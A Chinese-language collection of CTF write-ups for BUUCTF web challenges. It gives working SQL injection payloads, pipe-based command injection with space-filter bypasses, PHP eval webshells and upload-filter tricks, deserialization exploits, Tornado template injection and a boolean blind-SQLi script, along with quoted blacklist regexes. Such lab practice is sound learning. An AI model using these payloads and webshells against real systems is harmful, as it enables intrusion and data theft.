
## `[极客大挑战 2019] EasySQL`
用万能密码直接绕过`admin' or 1=1#`密码随便输，得到flag
## `[极客大挑战 2019] Havefun`
php源码隐藏在元素里 `?cat=dog`得到flag
## `[ACTF2020 新生赛]Include`
点击tip查看发送的是`?file=flag.php`可以试一下查看源码`?file=php://filter/read=convert.base64-encode/resource=index.php`得到base64加密后的源码，base64解码后得到
```php
<?php
error_reporting(0);
$file = $_GET["file"];
if(stristr($file,"php://input") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"data:")){
	exit('hacker!');
}
if($file){
	include($file);
}else{
	echo '<a href="?file=flag.php">tips</a>';
}
?>

```
可以看到好多伪协议都被禁止了，但可以用php://filter,所以`?file=php://filter/read=convert.base64-encode/resource=flag.php`得到flag文件的bsae64加密格式，解码看到flag原来藏在flag.php的注释里
## `[HCTF 2018]WarmUp`
打开元素，注释里有提示`source.php`访问后看到源代码  
```php
<?php  
    highlight_file(__FILE__);  
    class emmm    {  
        public static function checkFile(&$page) //public static function checkFile(&$page)`：定义一个公共静态方法`checkFile`，接收一个引用参数`$page`（即用户传入的`file`参数），用于验证文件是否允许被包含。
        {            
        $whitelist = ["source"=>"source.php","hint"=>"hint.php"];  //定义一个关联数组`$whitelist`，作为允许被包含的文件白名单，仅允许`source.php`和`hint.php`两个文件。
            if (! isset($page) || !is_string($page)) {  //校验`$page`是否存在（`isset($page)`）且是否为字符串（`is_string($page)`）。
                echo "you can't see it";  
                return false;  
            }  
  
            if (in_array($page, $whitelist)) { 
 //`in_array($page, $whitelist)`：判断`$page`是否是白名单数组中的值（即是否为`source.php`或`hint.php`）。 
                return true;  
            }            
            $_page = mb_substr(                
            $page,              
              0,                
            mb_strpos($page . '?', '?') //$page . '?'`：在`$page`后拼接一个`?`，确保`mb_strpos`一定能找到`?`（避免`$page`中没有`?`时返回`false`）。 `mb_strpos(..., '?')`：找到第一个 `?` 的位置。 `mb_substr($page, 0, ...)`：从 `$page` 开头截取到 `?` 之前的部分（即文件路径部分）。若截取后的 `$_page` 在白名单中，返回 `true`（校验通过）。
            );  
    
            if (in_array($_page, $whitelist)) {  
                return true;  
            }            
            $_page = urldecode($page);            
            $_page = mb_substr(                
            $_page,                
            0,                
            mb_strpos($_page . '?', '?')  
            ); 
//- `urldecode($page)`：对 `$page` 进行 URL 解码（将编码后的特殊字符还原，如 `%3F` 变为 `?`）。
//- 后续逻辑与第二层相同：截取解码后字符串中 `?` 之前的部分，若在白名单中则返回 `true`。 
            if (in_array($_page, $whitelist)) {  
                return true;  
            }  
            echo "you can't see it";  
            return false;  
        }  
    }  
  
    if (! empty($_REQUEST['file'])//确保 `file` 参数存在且不为空。  
        && is_string($_REQUEST['file'])//确保 `file` 参数是字符串  
        && emmm::checkFile($_REQUEST['file']) //- `emmm::checkFile(...)`：调用 `emmm` 类的静态方法 `checkFile` 对 `file` 参数进行校验，返回 `true` 则通过。 
    ) {  
        include $_REQUEST['file'];  
        exit;  
    } else {  
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";  
    }  ?>
```
访问hint.php知道flag文件为`ffffllllaaaagggg`
所以不能出现?,因为网页解码一次，php代码解码一次，所以对?两次url编码为%253F,访问`?file=source.php%253F../../ffffllllaaaagggg`没有报错，返回为空，所以flag在更深层目录，一层一层试，最后在`?file=source.php%253F../../../../../ffffllllaaaagggg`找到flag
## `[ACTF2020 新生赛]Exec`
可以输入`127.0.0.1|whoami`得到www-data,说明可以利用管道符输入指令，`127.0.0.1|ls /`列出根目录，找到flag文件`127.0.0.1|cat /flag`得到flag
## `[GXYCTF2019]Ping Ping Ping`
空格过滤:<  , <>, %20,%09，`$IFS$9`,`${IFS}`,`$IFS`,`$IFS$1`,`%0a` `%a0`好像1改成其他数字也行
输入`?ip=127.0.0.1|whoami`返回`www-data`说明可以执行命令，`?ip=127.0.0.1|ls`返回flag.php 和index.php,`?ip=127.0.0.1|cat flag.php`返回说明空格被过滤了，可以用以上代替，但一些字符也被过滤了，测试一下发现只有`$IFS$9` `$IFS`可以，其余的因为带其他符号被过滤了，但flag,也被过滤了，可以先访问index.php`?ip=127.0.0.1|cat$IFS$9index.php`
```php
<!--?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\-->
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");//过滤的字符
  } else if(preg_match("/ /", $ip)){//过滤空格
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){//过滤bash
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");//过
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "

";
  print_r($a);
}

?>
```
**知识补充**：
- 代码执行函数：eval,assert,preg_replace,all_user_func,call_user_func_array,array_map,array_filter,create_function
- 命令执行函数：system,exec,shell_exec,popen,passthru,proc_open,pcntl_exec
- 文件读取函数：file_get_contents,readfile,highlight_file,fopen,fread,fgetss,fgets,show_source,file,parse_ini_file
所以可以利用代码`?ip=127.0.0.1;b=g;cat$IFS$9fla$b.php`来绕过flag过滤，`$b`被自动替换成g,因为可以利用管道符执行命令，没有报错，鼠标右键查看源码，发现flag藏在注释里
## `[SUCTF 2019]EasySQL`
原后端语句为`select $_POST['query'] || flag from flag`
pyload 为`1;set sql_mode=PIPES_AS_CONCAT;select 1`会拼接到``
`$_POST['query']`位置，所以拼接后语句为`select 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag from flag`得到flag(后端语句是搜的，自己猜不到)
sql_mode是一组mysql支持的基本语法和校验规则，sql_mode设置了PIPES_AS_CONCAT时||就是字符串连接符，相当于concat()函数，没有时就是逻辑或，最后拼接相当于将select 1和select flag from flag 的结果拼接在一起
## `[极客大挑战 2019]LoveSQL`
利用万能密码`admin' or 1=1#`登录成功,显示用户为admin,和密码，可以试一下联合查询， `admin' order by 3#`(提示：第二次输入时用户名就不能输入admin，因为已经用admin登录成功了),4就不行，所以有三列，再爆显示位，`ad' union select 1,2,3#`发现2,3回显，再查库名`-1' union select 1,database(),version()#`库名为geek,再查`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek'#`
查表名geekuser,l0ve1ysq1，再`?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'#`得到`id,username,password`再`-1' union select 1,2,group_concat(concat_ws('~',username,password)) from l0ve1ysq1# `得到flag
## `[极客大挑战 2019]Secret File`
打开f12,找到一个网址点开，点secret瞬间结束，根本看不到，所以需要抓包，抓到后发送到repeater重放后的响应包里有一个隐藏的文件，  secr3t.php访问后看到一堆php代码，先不代码审计，先试一下伪协议，因为提示flag放在了flag.php里`?file=php://filter/read=convert.base64-encode/resource=flag.php`得到乱码用base64解码，发现藏在其中的flag。但也可以代码审计
```php
if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
```
- `strstr($file,"../")`：检查`$file`中是否包含`../`（路径遍历的典型特征，用于向上级目录跳转），**区分大小写**。
- `stristr($file, "tp")`：检查`$file`中是否包含`tp`（可能是过滤`tp框架`相关路径），**不区分大小写**（即`TP`、`Tp`等也会被拦截）。
- `stristr($file,"input")`：检查是否包含`input`（可能过滤`php://input`伪协议，该协议可用于提交数据），**不区分大小写**。
- `stristr($file,"data")`：检查是否包含`data`（可能过滤`data://`伪协议，该协议可用于执行代码），**不区分大小写**
可以发现没过滤php://filter协议
## `[强网杯 2019]随便注`
输入`1'`报错，猜测用报错注入，常用函数有`updataxml` `extractvalue`  `floor`,输入`1' order by 2#`判断有两列`1' union select 1,2#`返回`return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`说明有些词被不区分大小写（因为后面有i）的禁止了，所以`updataxml`是不行了，用extractvalue试试`1' and (extractvalue(1,concat(0x7e,database(),0x7e)));#`查找database,得到supersqli
接下来就困难了，常规的话必须要用到select了，要用堆叠查询  
可以用`1'; show databases;`可以列出所有数据库，其中就有`supersqli`,再输入`1';show tables;`得到`1919810931114514`和`words`猜测`1919810931114514`是重要文件。再输入
```
1';show columns from `1919810931114514`;
```
**注意**：1919810931114514不是用单引号包裹，使用~键上的那个符号
看到flag字眼，但接下来查询又要用到select,不行，但可以自己设置一个系统变量，通过拼接的方式可以绕过正则匹配，
```
1';set @sql = concat('se','lect * from `1919810931114514`;');
prepare stmt from @sql;
EXECUTE stmt;#
```
返回`strstr($inject, "set") && strstr($inject, "prepare")`说明set,prepare 被禁了，但大小写不敏感，可以用```
```
1';sEt @sql = concat('se','lect * from `1919810931114514`;');
prEpare stmt from @sql;
EXECUTE stmt;#
```
得到flag
**补充知识**：concat , concat_ws , group_concat为常见的拼接语句
## `[极客大挑战 2019]Http`
进入网址发现界面没什么东西，但右键查看源码可以仔细找到一个`Secret.php`的文件，访问可以看到`# It doesn't come from 'https://Sycsecret.buuoj.cn'` 但是这个网页访问不了,所以可以用referer操作，得到数据
**补充知识**:HTTP请求中，Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。
例如，在www.google.com 里有一个www.baidu.com 链接，那么点击这个www.baidu.com ，它的header 信息里就有： `Referer=http://www.google.com`
X-Forwarded-For 是一个 HTTP 扩展头部，主要是为了让 Web 服务器获取访问用户的真实 IP 地址,但也可以抓包修改伪造
User-Agent 是客户端（如浏览器、APP）向服务器发送请求时，附带的一段**身份标识字符串**，用于告诉服务器自己的类型、版本等信息。

所以可以抓包加上`referer: https://Sycsecret.buuoj.cn`返回Please use "Syclover" browser，可以将user-agent改为Syclover再放包得到No!!! you can only read this locally!!!，所以再加上`x-forwarded-for: 127.0.0.1`返回flag。
## `[极客大挑战 2019]Upload`
可以上传一句话木马文件1.php
```php
<?php
@eval($_GET['cmd']);
?>
```
上传后返回not image,通过修改Content-Type: image/jpeg来伪装成图片，但返回not php,可以修改文件名为`1.phtml`,但返回不能包括`<?`符号，可以将一句换木马修改为`<script language="php">eval($_GET['cmd']);</script>`或者可以用 `<?=`代替`<?php`  ,但返回根本不是图片，可以在文件内容前头加`GIF89a`伪装成gif图片，记得与前一行有一行间隔，放包显示成功,访问文件试一下,因为上传的文件默认放到upload文件夹下，所以访问`upload/1.phtml`,看到代码没了，说明被当成代码执行了，上传成功，在`?cmd=system("ls /");`发现flag,再`?cmd=system("cat /flag");`得到flag
## `[极客大挑战 2019]Knife`
根据提示用菜刀或蚁剑连接，密码就是Syc,在根目录中找到flag
## `[ACTF2020 新生赛]Upload`
上传文件同上，上传后将后缀改为phtml,得到文件的地址，访问回显为空，说明文件内容当成代码执行了，按说用蚁剑能连接，但是失败了，所以就`?cmd=system("ls /");`  `?cmd=system("cat /flag");`得到flag
##  `[极客大挑战 2019]BabySQL1`

先用万能密码试一下，`1 or 1=1#`报错`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1=1#' and password='123'' at line 1`猜测or被过滤了，or可以用`||`代替可以再试一下`2' oorr 1=1#` 也可以
试一下`2'  oorrder by23 2#`报错`right syntax to use near '23 2#' and`说明by被过滤了，双写绕过，查出有三个，union 和select都可以双写绕过，得到库名geek,在查询，from和where也要双写绕过，记得`inforamtion`中的or也要双写
`1' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'#`
`1' ununionion selselectect 1,2,group_concat(concat_ws('~',username,passwoorrd)) frfromom b4bsql#`得到flag
## `[极客大挑战 2019]PHP1`
扫目录发现有一个`www.zip`的文件，访问得到一个压缩包，其中有个文件class.php
```php
<?php

include 'flag.php';
error_reporting(0); 
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function __wakeup(){
        $this->username = 'guest';
    }
    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();
        }
    }
}
?>
```
明显是反序列化的题，还有一段
```php
<?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
```
可以简单构造一下函数
```php
<?php
class Name{
    private $username = 'admin';
    private $password = 100;
}
$a = new Name($username,$password);
echo urlencode(serialize($a));
?>
```
使username='admin' password=100(记住不能有引号，不然就成字符串了)，得到`O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D`将属性数改为3绕过wakeup方法,最终payloads`?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D`
得到flag
## `[ACTF2020 新生赛]BackupFile`
扫一下目录，扫到一个文件打开
```php
<?php
include_once "flag.php";
if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```
因为是弱比较，所以`?key=123`就行了
##  `[极客大挑战 2019]BuyFlag`
进入`pay.php`界面后抓包发现包里有一个扎眼的`user=0`改为`user=1`提示你是cuit的学生了，要输入密码，打开网页源码发现有一个
```php
|   |
|---|
|<!--|
|~~~post money and password~~~|
|if (isset($_POST['password'])) {|
|$password = $_POST['password'];|
|if (is_numeric($password)) {|
|echo "password can't be number</br>";|
|}elseif ($password == 404) {|
|echo "Password Right!</br>";|
|}|
|}|
|-->|
```
说明要用post方法发送password和money,回到抓包，右键修改请求方法为post(直接将get删了改为post是不行的)，发送post`password=404a&money=100000000`(利用php弱比较特性)发现他说太长了，查一下php版本号是5.3.3,5.3.3版本下可以用函数strcmp（）对数字进行绕过,改为`money[]=1`得到flag[参考文章](https://blog.csdn.net/G653214/article/details/121944212?ops_request_misc=%257B%2522request%255Fid%2522%253A%25220b7c2ee38d17bd067edd486f4e8fba36%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=0b7c2ee38d17bd067edd486f4e8fba36&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121944212-null-null.142^v102^pc_search_result_base5&utm_term=php%20strcmp%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187)
## `[RoarCTF 2019]Easy Calc`
计算器不能输入数字，右键源码有`url:"calc.php?num="+encodeURIComponent($("#content").val()),`可以访问一下`calc.php`
```php
<?php  
error_reporting(0);  
if(!isset($_GET['num'])){    show_source(__FILE__);  
}else{        $str = $_GET['num'];        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];  
        foreach ($blacklist as $blackitem) {  
                if (preg_match('/' . $blackitem . '/m', $str)) {  
                        die("what are you want to do?");  
                }  
        }  
        eval('echo '.$str.';');  
}  
?>
```
源码泄露了，看到eval函数，可以命令执行，这里涉及到一个php特性
`' num'!='num'` 防火墙可能识别num但识别不了` num`,但php会将` num`解析为num,这样就绕过防火墙了，这时后面再输入字母就不会报错了，因为eval识别php代码，所以试一下` ?num=print_r(scandir('/'))`但单引号被过滤了，可以用chr()函数，避免使用单引号（还试了一下用十六进制，不行）` ?num=print_r(scandir(chr(47)))`执行成功了，找到一个f1agg文件，因为还是不能用单引号，所以用chr()函数拼接`? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`那个是1不是l,第一次看错了，找了好长时间
## `[HCTF 2018]admin`
直接弱指令爆破，密码为123,admin得到flag
## `[BJDCTF2020]Easy MD5`
与nssctf的奇妙的MD5一样
## `[MRCTF2020]你传你🐎呢`
修改content-type用.htaccess绕过
## `[MRCTF2020]Ez_bypass`
一个数组绕过，一个弱比较`passwd=1234567a`这不是数字，但可以解析为数字并比较

## `[ZJCTF 2019]NiZhuanSiWei`
可以先用data协议伪装文件，再试一下读取useless.php文件，读不了，这就可以用php://filter读，解码出一段代码，说明flag在flag.php文件里，这涉及到一段反序列话没有任何绕过，
```php
<?php  
class Flag{  //flag.php  
    public $file='flag.php';  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file);
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
} 
$a=new Flag();
$file=='flag.php';
echo serialize($a);
?>
```
得到序列话字符串，所以先`?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php`读取代码，再`?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`再源码注释中找到flag(老套路了)，最后一定记得一定将file的php://filte内容改为useless.php,php://filter只是用来读取文件的，不能进行包含

## `[网鼎杯 2020 青龙组]AreUSerialz`
如果construct和destruct同时存在，先construct再destruct，先代码审计
```php
<?php
include("flag.php");//flag所在位置
highlight_file(__FILE__);
class FileHandler {
    protected $op;
    protected $filename;
    protected $content;
    function __construct() {//1.首先调用construct
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();//2.调用process
    }
    public function process() {
        if($this->op == "1") {
            $this->write();//先不管write
        } else if($this->op == "2") {//因为设置op=2弱类型比较相等
            $res = $this->read();//3.首先注意到read,调用read
            $this->output($res);//5.调用output,把read的结果用output输出
        } else {
            $this->output("Bad Hacker!");
        }
    }
    private function write() {//因为主要是要读取文件，所以这个大概率是迷惑的，不用管
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }
    private function read() {//4.使filename=flag.php就行了
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }
    private function output($s) {//6.输出结果
        echo "[Result]: <br>";
        echo $s;
    }
    function __destruct() {
        if($this->op === "2")//只要设置op=2,不符合这个强类型比较
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))//私有属性前面有空字符，是不可见字符，但可以将变量都改为public绕过
            return false;
    return true;
}
if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }
}
```
构造exp
```php
<?php
class FileHandler {
    public $op=2;
    public $filename='flag.php';
    public $content="123";//这个不重要，可以不赋值
    }
$a=new FileHandler();
$b=serialize($a);
echo urlencode($b);
```

## `[GXYCTF2019]BabyUpload`
用.htaccess绕过，一句话木马用`<script language="php">eval($_POST['cmd']);phpinfo();</script>`其余两种都不行，再改一下content-type为`image/jpeg`


## `[GYCTF2020]Blacklist`
试一下，`1' order by 2#`找到有两个`1' union select 1,2#`回显`return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);`说明正常查询就不行了，可以试一下堆叠注入`1'; show databases;#`回显
![回显](./image/4.png)
输入`1';show tables;#`回显
![回显](./image/5.png)
注意到FlagHere，输入`1';show columns from FlagHere;#`
![回显](./image/6.png)
接下来就不会了，可以用`HANDLER OPEN`语句打开一个表，使其可以使用后续`HANDLER READ`语句访问，该表对象未被其他会话共享，并且在会话调用`HANDLER CLOSE`或会话终止之前不会关闭，payloads`1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#`得到flag
## `[CISCN2019 华北赛区 Day2 Web1]Hack World`
异或注入，如果输入1回显Hello, glzjin wants a girlfriend. 输入0，回显Error Occured When Fetch Result.利用这个可以写一个布尔盲注的脚本，这里把空格过滤了，可以用()代替
```python
import requests  
  
url = input("请输入url:")  
  
def check_payload(payload):  
    r=requests.post(url,data={"id":payload})  
    if "Hello, glzjin wants a girlfriend." in r.text:  
        return True  
    else:  
        return False  
  
result=""  
chars = r"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_+-*/@!#$%^&()[]=;:,.?<>~`'\" \n\r"  
for i in range(500):  
    payload=f"if(length((select(flag)from(flag)))={i},1,0)"  
    if check_payload(payload):  
        length=i  
        break  
print(f"长度是{length}")  
  
for i in range(1,length+1):  
    for c in chars:  
        payload=f"if(substr((select(flag)from(flag)),{i},1)='{c}',1,0)"  
        if check_payload(payload):  
            result+=c  
    print(result)  
print(f"最终结果是{result}")
```
但这个脚本是有缺陷的，因为数据库不区分大小写，所以出来的都是`fFlLaA{cC367aA5864fF6191a`大小写一起出来了，还要改进一下，所以查的时候要临时把chars里的大写字母临时删掉，也可以改成这样
```python
import requests  
  
url = input("请输入url:")  
  
def check_payload(payload):  
    r=requests.post(url,data={"id":payload})  
    if "Hello, glzjin wants a girlfriend." in r.text:  
        return True  
    else:  
        return False  
result=""  
for i in range(500):  
    payload=f"if(length((select(flag)from(flag)))={i},1,0)"  
    if check_payload(payload):  
        length=i  
        break  
print(f"长度是{length}")  
  
for i in range(1,length+1):  
    for j in range(32,127):  
        payload=f"if(ascii(substr((select(flag)from(flag)),{i},1))={j},1,0)"  
        if check_payload(payload):  
            result+=chr(j)  
    print(result)  
print(f"最终结果是{result}")
```
但请求一直出错，不知道为什么，每次出来的都不一样

## `[MRCTF2020]Ezpop`
构造exp
```php
<?php
class Modifier {
    protected  $var='php://filter/read=convert.base64-encode/resource=flag.php';

}
class Show{
    public $source;
    public $str;
    public function __construct(){
        $this->str = new Test();
    }
        }
class Test{
    public $p; 
    public function __construct(){
        $this->p =new Modifier();
    }
    }
if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
$a = new Show();
$b = new Show();
$b->str = "";
$b->source = $a;
var_dump($b);
var_dump(urlencode(serialize($b)));
```
得到flag
详解见[视频](https://www.bilibili.com/video/BV1YV411U7te/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=b4b34e2934fd08a2619ce1b66f6b9190))
## `[护网杯 2018]easy_tornado`
有一个flag.txt文件访问得到flag的地址，hint文件提示`md5(cookie_secret+md5(filename))`说明后面的filehash是这样得到的，但还是要知道cookie_secret,这时候试一下不添加filehash,直接报错error,但url重定向到了`/error?msg=Error`后面的msg是可以随意修改的，可以试一下模板注入`{{7*7}}`回显ORZ，这时候用`/error?msg={{handler.settings}}`得到cookie_secret,`de4fe69b-748a-4324-90b5-f3f5ae610f68` /fllllllllllllag md5之后为,`3bf9f6cf685a6dd8defadabfb41a03a1`,最终payload是`/file?filename=/fllllllllllllag&filehash=41d367be98bda42a7c4ff691f6879015`
##  `[GXYCTF2019]BabySQli`
随便输入一个用户名和密码，报错，查看源码，看到有一串`MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5`明显是base32编码,解码后是`c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==`明显是base64编码,解码后是`select * from user where username = '$name'`，可以看到只用数据库查询了name，没有查询password,用户名输入admin,密码随便输，爆error pass,试了一下，`() or =`都过滤了，不知道怎么做，可以看一下源代码，这些
```php
$arr = mysqli_fetch_row($result);
		// print_r($arr);
		if($arr[1] == "admin"){
			if(md5($password) == $arr[2]){
				echo $flag;
			}
```
，可以看到用户必须是admin,密码md5加密后是用户输入,可以用联表查询，先用`name=ad' union select 1,2,3#&pw=123`查一下字段为三个,再用`name=ad' union select 1,"admin","202cb962ac59075b964b07152d234b70"#&pw=123`得到flag,其中`202cb962ac59075b964b07152d234b70`是123 MD5加密后的结果，根据源码，admin必须是在第二个字段，密码在第三个字段
## `[安洵杯 2019]easy_serialize_php`
先phpinfo一下，看到有一个文件![](./image/69.png)
疑似flag,过滤函数filter()是对`serialize($_SESSION)`进行过滤，滤掉一些关键字,这个题只是把`$_SESSION`数组进行了serialize(),发现unset函数将`$_SESSION`销毁了。
然后重新赋予`$_SESSION`了新的值。
最后调用了`extract($_POST);`
extract() 函数从数组中将变量导入到当前的符号表。
根据extract()我们可以进行变量覆盖，当我们传入`SESSION[flag]=123`时，`$SESSION["user"]`和`$SESSION['function']` 全部会消失。
只剩下`_SESSION[flag]=123`。
